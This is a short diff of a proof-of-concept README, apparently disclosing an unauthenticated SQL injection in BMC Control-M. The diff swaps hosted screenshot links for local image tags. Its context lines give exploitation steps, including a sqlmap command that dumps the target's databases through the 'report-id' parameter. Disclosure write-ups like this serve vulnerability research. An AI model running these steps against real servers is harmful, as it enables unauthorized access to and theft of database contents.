@@ -30,7 +30,7 @@ Cookie: X
 ```
 Additional Info: _Cookie_ and _user_id_ headers must be present, but the value can be random.     
 Screenshot from BurpSuite:    
-![poc](https://github.com/DojoSecurity/BMC-Control-M-Unauthenticated-SQL-Injection/assets/44198831/a22930eb-3da5-470e-9116-0d25b35ee5a5)
+<img src="/BurpSuitePoC.jpg">
 
 **Steps to dump the database:**   
 Save the above request (without the payload) to a file request.txt :    
@@ -50,5 +50,5 @@ Execute following _sqlmap_ command:
 sqlmap -r request.txt -p report-id —-no-cast —-dbs 
 ```
 Screenshot of extracted database structure:   
-![dbscreen](https://github.com/DojoSecurity/BMC-Control-M-Unauthenticated-SQL-Injection/assets/44198831/45e98cb0-de9a-4411-959b-eabc40171634)
+<img src="/SqlmapPoC.png">
 
